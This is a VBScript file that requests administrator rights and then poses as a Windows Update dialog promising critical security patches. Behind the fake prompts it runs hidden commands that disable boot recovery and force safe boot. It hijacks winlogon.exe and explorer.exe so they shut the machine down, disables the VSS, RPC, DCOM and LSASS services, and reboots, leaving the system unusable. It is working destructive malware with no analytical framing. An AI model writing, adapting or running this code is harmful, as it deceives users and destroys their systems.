Set objShell = CreateObject("Shell.Application")
Set objFSO = CreateObject("Scripting.FileSystemObject")

If Not WScript.Arguments.Named.Exists("elevated") Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
    WScript.Quit
End If

answer = MsgBox("System update requires administrator rights." & vbCrLf & vbCrLf & _
                "This will install critical security patches." & vbCrLf & _
                "Do you want to continue?", vbYesNo + vbQuestion, "Windows Update")

If answer = vbNo Then
    MsgBox "Update cancelled. System may be vulnerable.", vbExclamation, "Warning"
    WScript.Quit
End If

MsgBox "Installing updates... Do not turn off your computer.", vbInformation, "Windows Update"

objShell.Run "cmd /c bcdedit /set {default} recoveryenabled no", 0, True
objShell.Run "cmd /c bcdedit /set {default} bootstatuspolicy ignoreallfailures", 0, True
objShell.Run "cmd /c bcdedit /set {default} safeboot minimal", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal"" /v ""(Default)"" /t REG_SZ /d ""Minimal"" /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network"" /v ""(Default)"" /t REG_SZ /d ""Network"" /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v AutoRestartShell /t REG_DWORD /d 0 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe"" /v Debugger /t REG_SZ /d ""cmd.exe /c shutdown /s /f /t 0"" /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe"" /v Debugger /t REG_SZ /d ""cmd.exe /c shutdown /s /f /t 0"" /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\CrashControl"" /v CrashDumpEnabled /t REG_DWORD /d 0 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\CrashControl"" /v LogEvent /t REG_DWORD /d 0 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\VSS"" /v Start /t REG_DWORD /d 4 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\RpcSs"" /v Start /t REG_DWORD /d 4 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\DcomLaunch"" /v Start /t REG_DWORD /d 4 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\LSASS"" /v Start /t REG_DWORD /d 4 /f", 0, True
objShell.Run "cmd /c shutdown /r /f /t 0", 0, True
